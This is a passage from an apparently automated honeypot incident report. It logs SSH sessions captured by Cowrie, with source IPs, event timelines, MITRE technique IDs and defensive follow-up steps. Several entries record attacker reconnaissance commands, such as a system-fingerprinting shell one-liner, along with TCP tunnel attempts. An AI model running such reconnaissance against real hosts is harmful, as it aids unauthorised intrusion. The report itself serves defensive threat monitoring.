| `2026-08-16 00:58:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-16 00:58:00` | `cowrie.direct-tcpip.data` |
| `2026-08-16 00:58:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.185[.]127` to AbuseIPDB if not already reported
- [ ] Block `171.231.185[.]127` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37aa9c24ec4d

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 00:57 |
| **Last Seen** | 2026-08-16 00:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 00:57:58` | `cowrie.session.connect` |
| `2026-08-16 00:57:59` | `cowrie.client.version` |
| `2026-08-16 00:57:59` | `cowrie.client.kex` |
| `2026-08-16 00:58:02` | `cowrie.login.success` |
| `2026-08-16 00:58:05` | `cowrie.session.params` |
| `2026-08-16 00:58:05` | `cowrie.command.input` |
| `2026-08-16 00:58:05` | `cowrie.command.input` |
| `2026-08-16 00:58:05` | `cowrie.command.input` |
| `2026-08-16 00:58:05` | `cowrie.command.input` |
| `2026-08-16 00:58:05` | `cowrie.command.input` |
| `2026-08-16 00:58:05` | `cowrie.command.success` |
| `2026-08-16 00:58:05` | `cowrie.command.input` |
| `2026-08-16 00:58:05` | `cowrie.command.input` |
| `2026-08-16 00:58:05` | `cowrie.command.input` |
| `2026-08-16 00:58:05` | `cowrie.command.input` |
| `2026-08-16 00:58:05` | `cowrie.log.closed` |
| `2026-08-16 00:58:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05df38da498f

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-16 00:58 |
| **Last Seen** | 2026-08-16 00:58 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 00:58:05` | `cowrie.session.connect` |
| `2026-08-16 00:58:11` | `cowrie.client.version` |
| `2026-08-16 00:58:11` | `cowrie.client.kex` |
| `2026-08-16 00:58:34` | `cowrie.login.success` |
| `2026-08-16 00:58:46` | `cowrie.session.params` |
| `2026-08-16 00:58:46` | `cowrie.command.input` |
| `2026-08-16 00:58:51` | `cowrie.log.closed` |
| `2026-08-16 00:58:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ecaf4d4d878

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 00:58 |
| **Last Seen** | 2026-08-16 00:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 00:58:14` | `cowrie.session.connect` |
| `2026-08-16 00:58:14` | `cowrie.client.version` |
| `2026-08-16 00:58:14` | `cowrie.client.kex` |
| `2026-08-16 00:58:15` | `cowrie.login.success` |
| `2026-08-16 00:58:15` | `cowrie.session.params` |
| `2026-08-16 00:58:15` | `cowrie.command.input` |
| `2026-08-16 00:58:16` | `cowrie.log.closed` |
| `2026-08-16 00:58:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66a1ba9fc54a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 00:59 |
| **Last Seen** | 2026-08-16 00:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 00:59:13` | `cowrie.session.connect` |
| `2026-08-16 00:59:13` | `cowrie.client.version` |
| `2026-08-16 00:59:13` | `cowrie.client.kex` |
| `2026-08-16 00:59:16` | `cowrie.login.success` |
| `2026-08-16 00:59:19` | `cowrie.session.params` |
| `2026-08-16 00:59:19` | `cowrie.command.input` |
| `2026-08-16 00:59:19` | `cowrie.command.input` |
| `2026-08-16 00:59:19` | `cowrie.command.input` |
| `2026-08-16 00:59:19` | `cowrie.command.input` |
| `2026-08-16 00:59:19` | `cowrie.command.input` |
| `2026-08-16 00:59:19` | `cowrie.command.success` |
| `2026-08-16 00:59:19` | `cowrie.command.input` |
| `2026-08-16 00:59:19` | `cowrie.command.input` |
| `2026-08-16 00:59:19` | `cowrie.command.input` |
| `2026-08-16 00:59:19` | `cowrie.command.input` |
| `2026-08-16 00:59:19` | `cowrie.log.closed` |
| `2026-08-16 00:59:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f545e10d0007

| Field | Detail |
|---|---|
| **Source IP** | `171.231.187[.]71` |
| **First Seen** | 2026-08-16 01:00 |
| **Last Seen** | 2026-08-16 01:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:00:17` | `cowrie.session.connect` |
| `2026-08-16 01:00:17` | `cowrie.client.version` |
| `2026-08-16 01:00:17` | `cowrie.client.kex` |
| `2026-08-16 01:00:19` | `cowrie.login.success` |
| `2026-08-16 01:00:20` | `cowrie.direct-tcpip.request` |
| `2026-08-16 01:00:20` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-16 01:00:20` | `cowrie.direct-tcpip.data` |
| `2026-08-16 01:00:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.187[.]71` to AbuseIPDB if not already reported
- [ ] Block `171.231.187[.]71` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf6177a84e11

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:00 |
| **Last Seen** | 2026-08-16 01:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:00:27` | `cowrie.session.connect` |
| `2026-08-16 01:00:28` | `cowrie.client.version` |
| `2026-08-16 01:00:28` | `cowrie.client.kex` |
| `2026-08-16 01:00:31` | `cowrie.login.success` |
| `2026-08-16 01:00:34` | `cowrie.session.params` |
| `2026-08-16 01:00:34` | `cowrie.command.input` |
| `2026-08-16 01:00:34` | `cowrie.command.input` |
| `2026-08-16 01:00:34` | `cowrie.command.input` |
| `2026-08-16 01:00:34` | `cowrie.command.input` |
| `2026-08-16 01:00:34` | `cowrie.command.input` |
| `2026-08-16 01:00:34` | `cowrie.command.success` |
| `2026-08-16 01:00:34` | `cowrie.command.input` |
| `2026-08-16 01:00:34` | `cowrie.command.input` |
| `2026-08-16 01:00:34` | `cowrie.command.input` |
| `2026-08-16 01:00:34` | `cowrie.command.input` |
| `2026-08-16 01:00:34` | `cowrie.log.closed` |
| `2026-08-16 01:00:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b345e89655d

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:01 |
| **Last Seen** | 2026-08-16 01:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:01:41` | `cowrie.session.connect` |
| `2026-08-16 01:01:42` | `cowrie.client.version` |
| `2026-08-16 01:01:42` | `cowrie.client.kex` |
| `2026-08-16 01:01:45` | `cowrie.login.success` |
| `2026-08-16 01:01:48` | `cowrie.session.params` |
| `2026-08-16 01:01:48` | `cowrie.command.input` |
| `2026-08-16 01:01:48` | `cowrie.command.input` |
| `2026-08-16 01:01:48` | `cowrie.command.input` |
| `2026-08-16 01:01:48` | `cowrie.command.input` |
| `2026-08-16 01:01:48` | `cowrie.command.input` |
| `2026-08-16 01:01:48` | `cowrie.command.success` |
| `2026-08-16 01:01:48` | `cowrie.command.input` |
| `2026-08-16 01:01:48` | `cowrie.command.input` |
| `2026-08-16 01:01:48` | `cowrie.command.input` |
| `2026-08-16 01:01:48` | `cowrie.command.input` |
| `2026-08-16 01:01:49` | `cowrie.log.closed` |
| `2026-08-16 01:01:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25c7e223b025

| Field | Detail |
|---|---|
| **Source IP** | `171.231.185[.]127` |
| **First Seen** | 2026-08-16 01:02 |
| **Last Seen** | 2026-08-16 01:02 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:02:19` | `cowrie.session.connect` |
| `2026-08-16 01:02:19` | `cowrie.client.version` |
| `2026-08-16 01:02:19` | `cowrie.client.kex` |
| `2026-08-16 01:02:30` | `cowrie.login.success` |
| `2026-08-16 01:02:31` | `cowrie.direct-tcpip.request` |
| `2026-08-16 01:02:32` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-16 01:02:32` | `cowrie.direct-tcpip.data` |
| `2026-08-16 01:02:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.185[.]127` to AbuseIPDB if not already reported
- [ ] Block `171.231.185[.]127` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03c198ee9b7b

| Field | Detail |
|---|---|
| **Source IP** | `185.74.59[.]14` |
| **First Seen** | 2026-08-16 01:02 |
| **Last Seen** | 2026-08-16 01:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:02:31` | `cowrie.session.connect` |
| `2026-08-16 01:02:31` | `cowrie.client.version` |
| `2026-08-16 01:02:31` | `cowrie.client.kex` |
| `2026-08-16 01:02:31` | `cowrie.login.success` |
| `2026-08-16 01:02:32` | `cowrie.session.params` |
| `2026-08-16 01:02:32` | `cowrie.command.input` |
| `2026-08-16 01:02:32` | `cowrie.log.closed` |
| `2026-08-16 01:02:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.74.59[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.74.59[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-527b9a23ad53

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:02 |
| **Last Seen** | 2026-08-16 01:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:02:54` | `cowrie.session.connect` |
| `2026-08-16 01:02:55` | `cowrie.client.version` |
| `2026-08-16 01:02:55` | `cowrie.client.kex` |
| `2026-08-16 01:02:58` | `cowrie.login.success` |
| `2026-08-16 01:03:00` | `cowrie.session.params` |
| `2026-08-16 01:03:00` | `cowrie.command.input` |
| `2026-08-16 01:03:00` | `cowrie.command.input` |
| `2026-08-16 01:03:00` | `cowrie.command.input` |
| `2026-08-16 01:03:00` | `cowrie.command.input` |
| `2026-08-16 01:03:00` | `cowrie.command.input` |
| `2026-08-16 01:03:00` | `cowrie.command.success` |
| `2026-08-16 01:03:00` | `cowrie.command.input` |
| `2026-08-16 01:03:00` | `cowrie.command.input` |
| `2026-08-16 01:03:00` | `cowrie.command.input` |
| `2026-08-16 01:03:00` | `cowrie.command.input` |
| `2026-08-16 01:03:01` | `cowrie.log.closed` |
| `2026-08-16 01:03:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8d89fb2e3f2

| Field | Detail |
|---|---|
| **Source IP** | `171.231.185[.]127` |
| **First Seen** | 2026-08-16 01:03 |
| **Last Seen** | 2026-08-16 01:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:03:16` | `cowrie.session.connect` |
| `2026-08-16 01:03:16` | `cowrie.client.version` |
| `2026-08-16 01:03:16` | `cowrie.client.kex` |
| `2026-08-16 01:03:18` | `cowrie.login.success` |
| `2026-08-16 01:03:18` | `cowrie.direct-tcpip.request` |
| `2026-08-16 01:03:18` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-16 01:03:18` | `cowrie.direct-tcpip.data` |
| `2026-08-16 01:03:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.185[.]127` to AbuseIPDB if not already reported
- [ ] Block `171.231.185[.]127` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a0748ecb7d7

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:04 |
| **Last Seen** | 2026-08-16 01:04 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:04:08` | `cowrie.session.connect` |
| `2026-08-16 01:04:08` | `cowrie.client.version` |
| `2026-08-16 01:04:08` | `cowrie.client.kex` |
| `2026-08-16 01:04:13` | `cowrie.login.success` |
| `2026-08-16 01:04:15` | `cowrie.session.params` |
| `2026-08-16 01:04:15` | `cowrie.command.input` |
| `2026-08-16 01:04:15` | `cowrie.command.input` |
| `2026-08-16 01:04:15` | `cowrie.command.input` |
| `2026-08-16 01:04:15` | `cowrie.command.input` |
| `2026-08-16 01:04:15` | `cowrie.command.input` |
| `2026-08-16 01:04:15` | `cowrie.command.success` |
| `2026-08-16 01:04:15` | `cowrie.command.input` |
| `2026-08-16 01:04:15` | `cowrie.command.input` |
| `2026-08-16 01:04:15` | `cowrie.command.input` |
| `2026-08-16 01:04:15` | `cowrie.command.input` |
| `2026-08-16 01:04:16` | `cowrie.log.closed` |
| `2026-08-16 01:04:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6d0cc089ae3

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:05 |
| **Last Seen** | 2026-08-16 01:05 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:05:21` | `cowrie.session.connect` |
| `2026-08-16 01:05:21` | `cowrie.client.version` |
| `2026-08-16 01:05:21` | `cowrie.client.kex` |
| `2026-08-16 01:05:26` | `cowrie.login.success` |
| `2026-08-16 01:05:29` | `cowrie.session.params` |
| `2026-08-16 01:05:29` | `cowrie.command.input` |
| `2026-08-16 01:05:29` | `cowrie.command.input` |
| `2026-08-16 01:05:29` | `cowrie.command.input` |
| `2026-08-16 01:05:29` | `cowrie.command.input` |
| `2026-08-16 01:05:29` | `cowrie.command.input` |
| `2026-08-16 01:05:29` | `cowrie.command.success` |
| `2026-08-16 01:05:29` | `cowrie.command.input` |
| `2026-08-16 01:05:29` | `cowrie.command.input` |
| `2026-08-16 01:05:29` | `cowrie.command.input` |
| `2026-08-16 01:05:29` | `cowrie.command.input` |
| `2026-08-16 01:05:29` | `cowrie.log.closed` |
| `2026-08-16 01:05:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a5e76692a5c

| Field | Detail |
|---|---|
| **Source IP** | `183.167.217[.]86` |
| **First Seen** | 2026-08-16 01:06 |
| **Last Seen** | 2026-08-16 01:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:06:08` | `cowrie.session.connect` |
| `2026-08-16 01:06:08` | `cowrie.client.version` |
| `2026-08-16 01:06:08` | `cowrie.client.kex` |
| `2026-08-16 01:06:11` | `cowrie.login.success` |
| `2026-08-16 01:06:11` | `cowrie.direct-tcpip.request` |
| `2026-08-16 01:06:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.167.217[.]86` to AbuseIPDB if not already reported
- [ ] Block `183.167.217[.]86` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93c31a786157

| Field | Detail |
|---|---|
| **Source IP** | `171.231.187[.]71` |
| **First Seen** | 2026-08-16 01:06 |
| **Last Seen** | 2026-08-16 01:08 |
| **Session Duration** | 145s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:06:20` | `cowrie.session.connect` |
| `2026-08-16 01:06:20` | `cowrie.client.version` |
| `2026-08-16 01:06:21` | `cowrie.client.kex` |
| `2026-08-16 01:07:29` | `cowrie.login.success` |
| `2026-08-16 01:08:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.187[.]71` to AbuseIPDB if not already reported
- [ ] Block `171.231.187[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae0526886bd5

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:06 |
| **Last Seen** | 2026-08-16 01:06 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:06:33` | `cowrie.session.connect` |
| `2026-08-16 01:06:34` | `cowrie.client.version` |
| `2026-08-16 01:06:34` | `cowrie.client.kex` |
| `2026-08-16 01:06:38` | `cowrie.login.success` |
| `2026-08-16 01:06:42` | `cowrie.session.params` |
| `2026-08-16 01:06:42` | `cowrie.command.input` |
| `2026-08-16 01:06:42` | `cowrie.command.input` |
| `2026-08-16 01:06:42` | `cowrie.command.input` |
| `2026-08-16 01:06:42` | `cowrie.command.input` |
| `2026-08-16 01:06:42` | `cowrie.command.input` |
| `2026-08-16 01:06:42` | `cowrie.command.success` |
| `2026-08-16 01:06:42` | `cowrie.command.input` |
| `2026-08-16 01:06:42` | `cowrie.command.input` |
| `2026-08-16 01:06:42` | `cowrie.command.input` |
| `2026-08-16 01:06:42` | `cowrie.command.input` |
| `2026-08-16 01:06:42` | `cowrie.log.closed` |
| `2026-08-16 01:06:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dade3110fe5

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
